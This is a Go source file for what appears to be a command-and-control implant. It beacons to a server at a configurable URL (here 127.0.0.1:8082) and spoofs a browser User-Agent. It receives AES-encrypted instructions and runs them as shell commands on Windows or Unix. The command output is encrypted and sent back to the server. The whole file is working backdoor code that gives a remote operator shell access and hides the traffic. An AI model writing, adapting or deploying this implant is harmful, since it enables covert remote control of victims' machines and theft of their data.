package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"io"
	"io/ioutil"
	"math/big"
	"net/http"
	"os/exec"
	"runtime"
	"strconv"
	"time"
)

const URL   = "http://127.0.0.1:8082"
var isDone = make(chan int)

func RunCMD(cmd string) string{
	cmd0 := exec.Command("sh", "-c", cmd)
	if runtime.GOOS == "windows" {
		cmd0 = exec.Command("cmd", "/c", cmd)
	}
	stdout0 , _ := cmd0.StdoutPipe()
	cmd0.Start()
	useBufferIO := false
	if !useBufferIO {
		var outputBuf0 bytes.Buffer
		for {
			tempoutput := make([]byte, 256)
			n, err := stdout0.Read(tempoutput)
			if err != nil {
				if err == io.EOF {
					break
				}
			}
			if n > 0 {
				outputBuf0.Write(tempoutput[:n])
			}
		}
		return outputBuf0.String()
	} else {
		outputbuf0 := bufio.NewReader(stdout0)
		touput0 , _ , _ := outputbuf0.ReadLine()
		return  string(touput0)
	}
}


func AesCtrEncrypt(plainText, key []byte) string {
	block, _:= aes.NewCipher(key)
	iv := bytes.Repeat([]byte("1"), block.BlockSize())
	stream := cipher.NewCTR(block, iv)
	dst := make([]byte, len(plainText))
	stream.XORKeyStream(dst, plainText)
	return base64.URLEncoding.EncodeToString(dst)
}

func AesCtrDecrypt(encryptData, key []byte) string {
	block, _:= aes.NewCipher(key)
	iv := bytes.Repeat([]byte("1"), block.BlockSize())
	stream := cipher.NewCTR(block, iv)
	dst := make([]byte, len(encryptData))
	stream.XORKeyStream(dst, encryptData)
	return string(dst)

}


func CreateRandomString(len int) string  {
	var container string
	var str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0;i < len ;i++  {
		randomInt,_ := rand.Int(rand.Reader,bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

func Post(url string, data interface{},action string, crj string) string {
	client := &http.Client{Timeout: 5 * time.Second}
	jsonStr, _ := json.Marshal(data)
	reqest, err := http.NewRequest("POST", url,  bytes.NewBuffer(jsonStr))
	cra := CreateRandomString(16)
	reqest.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) " +
		"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36")
	reqest.Header.Add("X-Requested-With", crj)
	reqest.Header.Add("Authorization",cra)
	reqest.Header.Add("WWW",AesCtrEncrypt([]byte(action),[]byte(cra)))
	if err != nil {
		panic(err)
	}
	response, _ := client.Do(reqest)
	defer response.Body.Close()
	result, _ := ioutil.ReadAll(response.Body)
	return string(result)

}


func main() {
	go func() {
		defer func() {
			if err := recover(); err != nil {
				isDone <- 1
			}
		}()
		var r= make(map[string]string)
		for {
			crj := CreateRandomString(16)
			var tempMap map[string]string
			r["data"] = strconv.FormatInt(time.Now().Unix(), 10)
			time.Sleep(1 * time.Second)
			resp := Post(URL, r, "ping", crj)
			_ = json.Unmarshal([]byte(resp), &tempMap)
			action_, _ := base64.URLEncoding.DecodeString(tempMap["info"])
			action := AesCtrDecrypt([]byte(action_), []byte(tempMap["username"]))
			if action != "pong" {
				res := RunCMD(action)
				r["data"] = AesCtrEncrypt([]byte(res), []byte(crj))
				Post(URL, r, "resp", crj)
			}
		}

	}()
	<-isDone
}
